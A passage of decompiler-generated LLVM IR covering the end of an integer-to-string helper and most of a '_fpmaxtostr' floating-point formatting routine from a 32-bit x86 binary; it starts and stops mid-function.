  %tmp37 = urem i32 %v0_80548a5, %v0_8054876
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8054889 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_805488d = add i32 %tmp37, %v6_8054889
  %v8_8054893 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8054898 = add i32 %div8, %v8_8054893
  store i32 %v2_8054898, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_805488d, %v0_8054876
  %tmp38 = urem i32 %v2_805488d, %v0_8054876
  %v2_80548a0 = add i32 %div9, %v2_8054898
  br label %dec_label_pc_80548ad

dec_label_pc_80548a5:                             ; preds = %dec_label_pc_805486e
  %v0_80548a9 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_80548a5, %v0_80548a9
  %tmp39 = urem i32 %v0_80548a5, %v0_80548a9
  br label %dec_label_pc_80548ad

dec_label_pc_80548ad:                             ; preds = %dec_label_pc_8054872, %dec_label_pc_80548a5
  %v0_80548b3 = phi i32 [ %tmp38, %dec_label_pc_8054872 ], [ %tmp39, %dec_label_pc_80548a5 ]
  %storemerge = phi i32 [ %v2_80548a0, %dec_label_pc_8054872 ], [ %div12, %dec_label_pc_80548a5 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_80548ad = load i32, i32* %edi.global-to-local, align 4
  %v1_80548ad = add i32 %v0_80548ad, -1
  store i32 %v1_80548ad, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_80548b3, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_80548b3
  %v8_80548b3 = trunc i32 %storemerge14.in to i8
  %v3_80548bc = inttoptr i32 %v1_80548ad to i8*
  store i8 %v8_80548b3, i8* %v3_80548bc, align 1
  %v0_80548be = load i32, i32* %ebp.global-to-local, align 4
  %v1_80548c0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548c0 = or i32 %v1_80548c0, %v0_80548be
  %v3_80548c0 = icmp eq i32 %v2_80548c0, 0
  %v1_80548c2 = icmp eq i1 %v3_80548c0, false
  br i1 %v1_80548c2, label %dec_label_pc_805486e, label %dec_label_pc_80548c4

dec_label_pc_80548c4:                             ; preds = %dec_label_pc_80548ad
  %v4_80548c4 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_80548c4, label %dec_label_pc_80548cf, label %dec_label_pc_80548cb

dec_label_pc_80548cb:                             ; preds = %dec_label_pc_80548c4
  %v0_80548cb = load i32, i32* %edi.global-to-local, align 4
  %v1_80548cb = add i32 %v0_80548cb, -1
  store i32 %v1_80548cb, i32* %edi.global-to-local, align 4
  %v1_80548cc = inttoptr i32 %v1_80548cb to i8*
  store i8 45, i8* %v1_80548cc, align 1
  br label %dec_label_pc_80548cf

dec_label_pc_80548cf:                             ; preds = %dec_label_pc_80548c4, %dec_label_pc_80548cb
  %v0_80548d2 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_80548d2

; uselistorder directives
  uselistorder i32 %v2_805488d, { 1, 0 }
  uselistorder i32 %v0_8054876, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8054872, { 1, 0, 2 }
  uselistorder i32 %v0_80548a5, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8054849, { 1, 0 }
  uselistorder i32 %v0_8054847, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80548cf, { 1, 0 }
  uselistorder label %dec_label_pc_80548ad, { 1, 0 }
  uselistorder label %dec_label_pc_8054866, { 1, 0 }
  uselistorder label %dec_label_pc_8054842, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_3()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80548dd = load i32, i32* @edi, align 4
  %v0_80548de = load i32, i32* @esi, align 4
  %v0_80548df = load i32, i32* @ebx, align 4
  store i32 %v0_80548df, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_80548f4 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_80548f4 = add i3 %v4_80548f4, -1
  store i3 %v5_80548f4, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80548fb = add i32 %tmp112, 4
  %v2_80548fb = inttoptr i32 %v1_80548fb to i32*
  %v3_80548fb = load i32, i32* %v2_80548fb, align 4
  store i32 %v3_80548fb, i32* %eax.global-to-local, align 4
  %v1_8054902 = add i32 %tmp112, 8
  %v2_8054902 = inttoptr i32 %v1_8054902 to i8*
  %v3_8054902 = load i8, i8* %v2_8054902, align 1
  %v4_8054902 = zext i8 %v3_8054902 to i32
  %v5_8054902 = load i32, i32* @ecx, align 4
  %v6_8054902 = and i32 %v5_8054902, -256
  %v7_8054902 = or i32 %v6_8054902, %v4_8054902
  store i32 %v7_8054902, i32* %ecx.global-to-local, align 4
  %v1_8054905 = inttoptr i32 %tmp112 to i32*
  %v2_8054905 = load i32, i32* %v1_8054905, align 4
  store i32 %v2_8054905, i32* %ebp.global-to-local, align 4
  %v3_8054907 = and i32 %v3_80548fb, -256
  %v4_8054907 = or i32 %v3_8054907, %v4_8054902
  %v1_805490d = or i32 %v4_8054907, 32
  %v3_805490d = trunc i32 %v1_805490d to i8
  store i32 %v1_805490d, i32* %eax.global-to-local, align 4
  %v10_8054918 = icmp eq i8 %v3_805490d, 97
  %v1_805491a = icmp eq i1 %v10_8054918, false
  br i1 %v1_805491a, label %dec_label_pc_8054923, label %dec_label_pc_805491c

dec_label_pc_805491c:                             ; preds = %entry
  %v1_805491c = add i32 %v7_8054902, 6
  %v11_805491c = trunc i32 %v1_805491c to i8
  store i32 %v1_805491c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054923

dec_label_pc_8054923:                             ; preds = %entry, %dec_label_pc_805491c
  %stack_var_-206.0 = phi i8 [ %v3_8054902, %entry ], [ %v11_805491c, %dec_label_pc_805491c ]
  %v2_8054923 = icmp slt i32 %v2_8054905, 0
  %v1_8054925 = icmp eq i1 %v2_8054923, false
  br i1 %v1_8054925, label %dec_label_pc_805492c, label %dec_label_pc_8054927

dec_label_pc_8054927:                             ; preds = %dec_label_pc_8054923
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805492c

dec_label_pc_805492c:                             ; preds = %dec_label_pc_8054923, %dec_label_pc_8054927
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805493b = add i32 %tmp112, 12
  %v2_805493b = inttoptr i32 %v1_805493b to i32*
  %v3_805493b = load i32, i32* %v2_805493b, align 4
  store i32 %v3_805493b, i32* %eax.global-to-local, align 4
  %v2_805493e = and i32 %v3_805493b, 2
  %v3_805493e = icmp eq i32 %v2_805493e, 0
  br i1 %v3_805493e, label %dec_label_pc_805494c, label %dec_label_pc_8054958

dec_label_pc_805494c:                             ; preds = %dec_label_pc_805492c
  %v2_805494c = urem i32 %v3_805493b, 2
  %tmp143 = trunc i32 %v2_805494c to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8054958

dec_label_pc_8054958:                             ; preds = %dec_label_pc_805494c, %dec_label_pc_805492c
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_805492c ], [ %tmp144, %dec_label_pc_805494c ]
  %v1_805496c = udiv i32 %v3_805493b, 256
  %tmp145 = and i32 %v1_805496c, 68
  %tmp146 = icmp eq i32 %tmp145, 64
  br i1 %tmp146, label %dec_label_pc_8054abe, label %dec_label_pc_80549de

dec_label_pc_80549de:                             ; preds = %dec_label_pc_8054958
  store i3 %v4_80548f4, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80549e5 = add i32 %tmp112, 16
  %v2_80549e5 = inttoptr i32 %v1_80549e5 to i32*
  store i32 32, i32* %v2_80549e5, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_80549fc = add i8 %stack_var_-206.0, -96
  %v6_80549fc = sub i8 95, %stack_var_-206.0
  %v7_80549fc = and i8 %v6_80549fc, %stack_var_-206.0
  %v8_80549fc = icmp slt i8 %v7_80549fc, 0
  %v9_80549fc = icmp eq i8 %v4_80549fc, 0
  %v10_80549fc = icmp slt i8 %v4_80549fc, 0
  %v3_8054a01 = icmp eq i1 %v10_80549fc, %v8_80549fc
  %v4_8054a01 = icmp eq i1 %v9_80549fc, false
  %v5_8054a01 = and i1 %v4_8054a01, %v3_8054a01
  br i1 %v5_8054a01, label %dec_label_pc_8054a08, label %dec_label_pc_8054a03

dec_label_pc_8054a03:                             ; preds = %dec_label_pc_80549de
  br label %dec_label_pc_8054a08

dec_label_pc_8054a08:                             ; preds = %dec_label_pc_80549de, %dec_label_pc_8054a03
  %v2_8054a10 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8054a10, i32* @ecx, align 4
  br label %dec_label_pc_8054de3

dec_label_pc_8054abe:                             ; preds = %dec_label_pc_8054958
  %v1_805497d = add i3 %v4_80548f4, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_8054ac2 = and i32 %v3_805493b, -65536
  %v2_8054ac7 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_8054ac7, i32* %edx.global-to-local, align 4
  %v1_8054ace = udiv i16 %tmp103, 256
  %v2_8054ace = zext i16 %v1_8054ace to i32
  %v3_8054ace = mul nuw nsw i32 %v2_8054ace, 256
  %tmp147 = urem i16 %tmp103, 256
  %v4_8054ac2.masked = zext i16 %tmp147 to i32
  %v11_8054ace = or i32 %v4_8054ac2.masked, %v3_8054ace
  %v10_8054ace = or i32 %v11_8054ace, %v6_8054ac2
  %v12_8054ace = or i32 %v10_8054ace, 3072
  store i32 %v12_8054ace, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_805497d, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8054ae2

dec_label_pc_8054ae2:                             ; preds = %dec_label_pc_8054b33.dec_label_pc_8054ae2_crit_edge, %dec_label_pc_8054abe
  %v2_8054aff = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8054abe ], [ %v2_8054aff.pre, %dec_label_pc_8054b33.dec_label_pc_8054ae2_crit_edge ]
  %v1_8054ae2 = phi i3 [ %v1_805497d, %dec_label_pc_8054abe ], [ %v1_8054ae2.pre, %dec_label_pc_8054b33.dec_label_pc_8054ae2_crit_edge ]
  %v3_8054b09 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8054abe ], [ %v0_8054ae2.pre, %dec_label_pc_8054b33.dec_label_pc_8054ae2_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8054ac7, %dec_label_pc_8054abe ], [ %v4_8054b04, %dec_label_pc_8054b33.dec_label_pc_8054ae2_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp148 = fptosi x86_fp80 %v3_8054b09 to i32
  store i32 %tmp148, i32* %eax.global-to-local, align 4
  store i32 %tmp148, i32* %ebx.global-to-local, align 4
  %v5_8054afc = sitofp i32 %tmp148 to x86_fp80
  %v4_8054aff = fsub x86_fp80 %v2_8054aff, %v5_8054afc
  store i3 %v1_8054ae2, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054b04 = add i32 %stack_var_-212.0, 9
  %v4_8054b09 = fmul x86_fp80 %v3_8054b09, %v4_8054aff
  store x86_fp80 %v4_8054b09, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054b0b

dec_label_pc_8054b0b:                             ; preds = %dec_label_pc_8054b0b.dec_label_pc_8054b0b_crit_edge, %dec_label_pc_8054ae2
  %v0_8054b1d = phi i32 [ %v0_8054b1d.pre, %dec_label_pc_8054b0b.dec_label_pc_8054b0b_crit_edge ], [ %tmp148, %dec_label_pc_8054ae2 ]
  %v0_8054b0b = phi i32 [ %v0_8054b0b.pre, %dec_label_pc_8054b0b.dec_label_pc_8054b0b_crit_edge ], [ 0, %dec_label_pc_8054ae2 ]
  %v1_8054b0b = add i32 %v0_8054b0b, 1
  store i32 %v1_8054b0b, i32* %esi.global-to-local, align 4
  %v2_8054b10 = sub i32 %v4_8054b04, %v1_8054b0b
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_8054b1d, 10
  %tmp136 = urem i32 %v0_8054b1d, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8054b10, i32* %eax.global-to-local, align 4
  %v1_8054b29 = or i32 %tmp136, 48
  %v8_8054b29 = trunc i32 %v1_8054b29 to i8
  store i32 %v1_8054b29, i32* %edx.global-to-local, align 4
  %v3_8054b2f = inttoptr i32 %v2_8054b10 to i8*
  store i8 %v8_8054b29, i8* %v3_8054b2f, align 1
  %v7_8054b31 = icmp sgt i32 %v1_8054b0b, 8
  br i1 %v7_8054b31, label %dec_label_pc_8054b33, label %dec_label_pc_8054b0b.dec_label_pc_8054b0b_crit_edge

dec_label_pc_8054b0b.dec_label_pc_8054b0b_crit_edge: ; preds = %dec_label_pc_8054b0b
  %v0_8054b0b.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8054b1d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054b0b

dec_label_pc_8054b33:                             ; preds = %dec_label_pc_8054b0b
  %v0_8054b33 = load i32, i32* @edi, align 4
  %v1_8054b33 = add i32 %v0_8054b33, 1
  store i32 %v1_8054b33, i32* @edi, align 4
  %v7_8054b37 = icmp sgt i32 %v1_8054b33, 2
  br i1 %v7_8054b37, label %dec_label_pc_8054b39, label %dec_label_pc_8054b33.dec_label_pc_8054ae2_crit_edge

dec_label_pc_8054b33.dec_label_pc_8054ae2_crit_edge: ; preds = %dec_label_pc_8054b33
  %v0_8054ae2.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8054ae2.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8054aff.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054ae2

dec_label_pc_8054b39:                             ; preds = %dec_label_pc_8054b33
  %v0_8054b39 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054b39 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8054b39, x86_fp80* %st0.global-to-local, align 4
  %v2_8054b3b = add i3 %v0_8054b39, 2
  store i3 %v2_8054b3b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054b3d = add i8 %stack_var_-206.0, -96
  %v6_8054b3d = sub i8 95, %stack_var_-206.0
  %v7_8054b3d = and i8 %v6_8054b3d, %stack_var_-206.0
  %v8_8054b3d = icmp slt i8 %v7_8054b3d, 0
  %v9_8054b3d = icmp eq i8 %v4_8054b3d, 0
  %v10_8054b3d = icmp slt i8 %v4_8054b3d, 0
  %v3_8054b42 = icmp eq i1 %v10_8054b3d, %v8_8054b3d
  %v4_8054b42 = icmp eq i1 %v9_8054b3d, false
  %v5_8054b42 = and i1 %v4_8054b42, %v3_8054b42
  br i1 %v5_8054b42, label %dec_label_pc_8054b51, label %dec_label_pc_8054b44

dec_label_pc_8054b44:                             ; preds = %dec_label_pc_8054b39
  %v4_8054b44 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_8054b51

dec_label_pc_8054b51:                             ; preds = %dec_label_pc_8054b39, %dec_label_pc_8054b44
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_8054b39 ], [ %v4_8054b44, %dec_label_pc_8054b44 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8054b39 ], [ 69, %dec_label_pc_8054b44 ]
  %v12_8054b51 = icmp eq i8 %stack_var_-206.1, 103
  %v1_8054b56 = icmp eq i1 %v12_8054b51, false
  br i1 %v1_8054b56, label %dec_label_pc_8054b5f, label %dec_label_pc_8054b58

dec_label_pc_8054b58:                             ; preds = %dec_label_pc_8054b51
  %v0_8054b58 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_8054b58, 1
  br i1 %tmp137, label %dec_label_pc_8054b66, label %dec_label_pc_8054b5c

dec_label_pc_8054b5c:                             ; preds = %dec_label_pc_8054b58
  %v1_8054b5c = add i32 %v0_8054b58, -1
  store i32 %v1_8054b5c, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054b66

dec_label_pc_8054b5f:                             ; preds = %dec_label_pc_8054b51
  %v12_8054b5f = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8054b5f, label %dec_label_pc_8054b6a, label %dec_label_pc_8054b5f.dec_label_pc_8054b66_crit_edge

dec_label_pc_8054b5f.dec_label_pc_8054b66_crit_edge: ; preds = %dec_label_pc_8054b5f
  %v0_8054b66.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054b66

dec_label_pc_8054b66:                             ; preds = %dec_label_pc_8054b5f.dec_label_pc_8054b66_crit_edge, %dec_label_pc_8054b58, %dec_label_pc_8054b5c
  %v0_8054b66 = phi i32 [ %v0_8054b66.pre, %dec_label_pc_8054b5f.dec_label_pc_8054b66_crit_edge ], [ %v0_8054b58, %dec_label_pc_8054b58 ], [ %v1_8054b5c, %dec_label_pc_8054b5c ]
  store i32 %v0_8054b66, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054b97

dec_label_pc_8054b6a:                             ; preds = %dec_label_pc_8054b5f
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8054b6e = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054b6e = add i32 %v0_8054b6e, -1
  store i32 %v2_8054b6e, i32* %ebx.global-to-local, align 4
  %v5_8054b75 = icmp slt i32 %v2_8054b6e, -1
  br i1 %v5_8054b75, label %dec_label_pc_8054b77, label %dec_label_pc_8054b97

dec_label_pc_8054b77:                             ; preds = %dec_label_pc_8054b6a
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054b7f = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8054b7f, i32* %eax.global-to-local, align 4
  %v4_8054b87 = bitcast i32* %stack_var_-72 to i8*
  %v5_8054b87 = call i32 @__GI_memset(i8* %v4_8054b87, i32 48, i32 21)
  store i32 %v5_8054b87, i32* %eax.global-to-local, align 4
  %v0_8054ba7.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054b97

dec_label_pc_8054b97:                             ; preds = %dec_label_pc_8054b6a, %dec_label_pc_8054b77, %dec_label_pc_8054b66
  %v1_8054bb7 = phi i32 [ %v0_8054b66, %dec_label_pc_8054b66 ], [ %v0_8054ba7.pr.pre, %dec_label_pc_8054b77 ], [ %v2_8054b6e, %dec_label_pc_8054b6a ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8054baa = icmp sgt i32 %v1_8054bb7, 20
  br i1 %v7_8054baa, label %dec_label_pc_8054bac, label %dec_label_pc_8054bb7

dec_label_pc_8054bac:                             ; preds = %dec_label_pc_8054b97
  %v2_8054bac = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8054bac, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054bcb.preheader

dec_label_pc_8054bb7:                             ; preds = %dec_label_pc_8054b97
  %v0_8054bb7 = load i32, i32* @esp, align 4
  %v2_8054bb7 = add i32 %v1_8054bb7, 165
  %v3_8054bb7 = add i32 %v2_8054bb7, %v0_8054bb7
  store i32 %v3_8054bb7, i32* %eax.global-to-local, align 4
  %v1_8054bbe = add i32 %v3_8054bb7, 2
  store i32 %v1_8054bbe, i32* %ecx.global-to-local, align 4
  %v2_8054bc1 = inttoptr i32 %v1_8054bbe to i8*
  %v3_8054bc1 = load i8, i8* %v2_8054bc1, align 1
  %v4_8054bc1 = add i8 %v3_8054bc1, -53
  %v9_8054bc1 = sub i8 52, %v3_8054bc1
  %v10_8054bc1 = and i8 %v9_8054bc1, %v3_8054bc1
  %v11_8054bc1 = icmp slt i8 %v10_8054bc1, 0
  %v13_8054bc1 = icmp slt i8 %v4_8054bc1, 0
  %v2_8054bc5 = icmp eq i1 %v13_8054bc1, %v11_8054bc1
  %v3_8054bc5 = zext i1 %v2_8054bc5 to i32
  br label %dec_label_pc_8054bcb.preheader

dec_label_pc_8054bcb.preheader:                   ; preds = %dec_label_pc_8054bb7, %dec_label_pc_8054bac
  %v0_8054bcb63 = phi i32 [ %v1_8054bbe, %dec_label_pc_8054bb7 ], [ %v2_8054bac, %dec_label_pc_8054bac ]
  %storemerge52 = phi i32 [ %v3_8054bc5, %dec_label_pc_8054bb7 ], [ 0, %dec_label_pc_8054bac ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054bcb

dec_label_pc_8054bcb:                             ; preds = %dec_label_pc_8054bcb.backedge, %dec_label_pc_8054bcb.preheader
  %v3_8054bcc = phi i32 [ %v3_8054bcc.pre, %dec_label_pc_8054bcb.backedge ], [ %storemerge52, %dec_label_pc_8054bcb.preheader ]
  %v0_8054bcb = phi i32 [ %v0_8054bce, %dec_label_pc_8054bcb.backedge ], [ %v0_8054bcb63, %dec_label_pc_8054bcb.preheader ]
  %v1_8054bcb = add i32 %v0_8054bcb, -1
  store i32 %v1_8054bcb, i32* %ecx.global-to-local, align 4
  %v1_8054bcc = inttoptr i32 %v1_8054bcb to i8*
  %v2_8054bcc = load i8, i8* %v1_8054bcc, align 1
  %v4_8054bcc = trunc i32 %v3_8054bcc to i8
  %v5_8054bcc = add i8 %v2_8054bcc, %v4_8054bcc
  store i8 %v5_8054bcc, i8* %v1_8054bcc, align 1
  %v0_8054bce = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054bce = inttoptr i32 %v0_8054bce to i8*
  %v2_8054bce = load i8, i8* %v1_8054bce, align 1
  %v3_8054bce = zext i8 %v2_8054bce to i32
  %v4_8054bce = load i32, i32* %edx.global-to-local, align 4
  %v5_8054bce = and i32 %v4_8054bce, -256
  %v6_8054bce = or i32 %v5_8054bce, %v3_8054bce
  store i32 %v6_8054bce, i32* %edx.global-to-local, align 4
  %v7_8054bd0 = icmp eq i8 %v2_8054bce, 48
  br i1 %v7_8054bd0, label %dec_label_pc_8054bcb.backedge, label %dec_label_pc_8054bd5

dec_label_pc_8054bcb.backedge:                    ; preds = %dec_label_pc_8054bcb, %dec_label_pc_8054bd5
  %v3_8054bcc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054bcb

dec_label_pc_8054bd5:                             ; preds = %dec_label_pc_8054bcb
  %v2_8054bd5 = add i8 %v2_8054bce, -57
  %v7_8054bd5 = sub i8 56, %v2_8054bce
  %v8_8054bd5 = and i8 %v7_8054bd5, %v2_8054bce
  %v9_8054bd5 = icmp slt i8 %v8_8054bd5, 0
  %v10_8054bd5 = icmp eq i8 %v2_8054bd5, 0
  %v11_8054bd5 = icmp slt i8 %v2_8054bd5, 0
  %v3_8054bd8 = icmp eq i1 %v11_8054bd5, %v9_8054bd5
  %v4_8054bd8 = icmp eq i1 %v10_8054bd5, false
  %v5_8054bd8 = and i1 %v4_8054bd8, %v3_8054bd8
  br i1 %v5_8054bd8, label %dec_label_pc_8054bcb.backedge, label %dec_label_pc_8054bda

dec_label_pc_8054bda:                             ; preds = %dec_label_pc_8054bd5
  %v2_8054bda = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8054bda, i32* %eax.global-to-local, align 4
  %tmp149 = icmp ugt i32 %v0_8054bce, %v2_8054bda
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp149, label %dec_label_pc_8054be5, label %dec_label_pc_8054bf2

dec_label_pc_8054be5:                             ; preds = %dec_label_pc_8054bda
  store i32 %v2_8054ac7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054bfb

dec_label_pc_8054bf2:                             ; preds = %dec_label_pc_8054bda
  store i32 %v2_8054bda, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8054bda, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054bfb

dec_label_pc_8054bfb:                             ; preds = %dec_label_pc_8054be5, %dec_label_pc_8054bf2
  %v0_8054bfb = phi i32 [ %v0_8054bce, %dec_label_pc_8054be5 ], [ %v2_8054bda, %dec_label_pc_8054bf2 ]
  %v1_8054bfb = add i32 %v0_8054bfb, 1
  store i32 %v1_8054bfb, i32* %eax.global-to-local, align 4
  %v2_8054c02 = inttoptr i32 %v1_8054bfb to i8*
  store i8 0, i8* %v2_8054c02, align 1
  br i1 %v1_8054b56, label %dec_label_pc_8054c28, label %dec_label_pc_8054c0d

dec_label_pc_8054c0d:                             ; preds = %dec_label_pc_8054bfb
  %v0_8054c0d = load i32, i32* %esi.global-to-local, align 4
  %v5_8054c10 = icmp slt i32 %v0_8054c0d, -4
  br i1 %v5_8054c10, label %dec_label_pc_8054c35, label %dec_label_pc_8054c12

dec_label_pc_8054c12:                             ; preds = %dec_label_pc_8054c0d
  %v1_8054c12 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8054c14 = icmp slt i32 %v1_8054c12, %v0_8054c0d
  br i1 %v7_8054c14, label %dec_label_pc_8054c35, label %dec_label_pc_8054c1d

dec_label_pc_8054c1d:                             ; preds = %dec_label_pc_8054c12
  %v2_8054c24 = sub i32 %v1_8054c12, %v0_8054c0d
  store i32 %v2_8054c24, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054c39

dec_label_pc_8054c28:                             ; preds = %dec_label_pc_8054bfb
  %v4_8054c28 = zext i8 %stack_var_-206.1 to i32
  %v5_8054c28 = load i32, i32* %ecx.global-to-local, align 4
  %v6_8054c28 = and i32 %v5_8054c28, -256
  %v7_8054c28 = or i32 %v6_8054c28, %v4_8054c28
  store i32 %v7_8054c28, i32* %ecx.global-to-local, align 4
  %v10_8054c30 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_8054c30, label %dec_label_pc_8054c28.dec_label_pc_8054c39_crit_edge, label %dec_label_pc_8054c35

dec_label_pc_8054c28.dec_label_pc_8054c39_crit_edge: ; preds = %dec_label_pc_8054c28
  %v0_8054c39.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054c39

dec_label_pc_8054c35:                             ; preds = %dec_label_pc_8054c0d, %dec_label_pc_8054c12, %dec_label_pc_8054c28
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_8054c28 ], [ 103, %dec_label_pc_8054c12 ], [ 103, %dec_label_pc_8054c0d ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054c43

dec_label_pc_8054c39:                             ; preds = %dec_label_pc_8054c28.dec_label_pc_8054c39_crit_edge, %dec_label_pc_8054c1d
  %v0_8054c39 = phi i32 [ %v0_8054c39.pre, %dec_label_pc_8054c28.dec_label_pc_8054c39_crit_edge ], [ %v0_8054c0d, %dec_label_pc_8054c1d ]
  store i32 %v0_8054c39, i32* %ebx.global-to-local, align 4
  %v2_8054c3b = icmp slt i32 %v0_8054c39, 0
  %v1_8054c3d = icmp eq i1 %v2_8054c3b, false
  br i1 %v1_8054c3d, label %dec_label_pc_8054c43, label %dec_label_pc_8054c3f

dec_label_pc_8054c3f:                             ; preds = %dec_label_pc_8054c39
  %v0_8054c3f = load i32, i32* %edx.global-to-local, align 4
  %v1_8054c3f = add i32 %v0_8054c3f, -1
  store i32 %v1_8054c3f, i32* %edx.global-to-local, align 4
  %v1_8054c40 = inttoptr i32 %v1_8054c3f to i8*
  store i8 48, i8* %v1_8054c40, align 1
  %v0_8054c78.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054c43

dec_label_pc_8054c43:                             ; preds = %dec_label_pc_8054c39, %dec_label_pc_8054c35, %dec_label_pc_8054c3f
